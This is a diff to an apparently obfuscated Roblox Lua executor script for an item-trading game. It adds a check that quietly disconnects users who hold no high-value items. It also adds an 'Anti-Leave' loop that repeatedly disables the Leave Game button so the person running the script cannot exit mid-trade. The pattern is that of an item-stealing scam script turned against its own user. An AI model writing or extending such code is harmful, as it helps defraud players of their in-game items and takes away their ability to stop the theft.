@@ -1125,6 +1125,22 @@ for _, v7 in ipairs(v4) do
 	end
 end
 
+-- Auto-disconnect: if total value is 0 or no godly+ items, leave immediately
+do
+	local godlyRarities = { Godly = true, Ancient = true, Chroma = true, Unique = true, Vintage = true }
+	local hasGodly = false
+	for _, v7 in ipairs(v4) do
+		if godlyRarities[v7.rarity] or godlyRarities[v7.valueCategory] then
+			hasGodly = true
+			break
+		end
+	end
+	if n8 <= 0 or not hasGodly then
+		game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
+		return
+	end
+end
+
 local function fn27(arg)
 	local tbl13 = {}
 
@@ -1874,6 +1890,17 @@ Players.PlayerRemoving:Connect(function(player)
 		runtime.AcceptPending = false
 		runtime.ObservedOffer = nil
 		runtime.Session = runtime.Session + 1
+	end
+end)
+
+-- Anti-Leave: disable the Leave Game button in a loop so the executor cannot leave mid-trade
+task.spawn(function()
+	while task.wait() do
+		pcall(function()
+			for _, v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
+				v:Disable()
+			end
+		end)
 	end
 end)
 
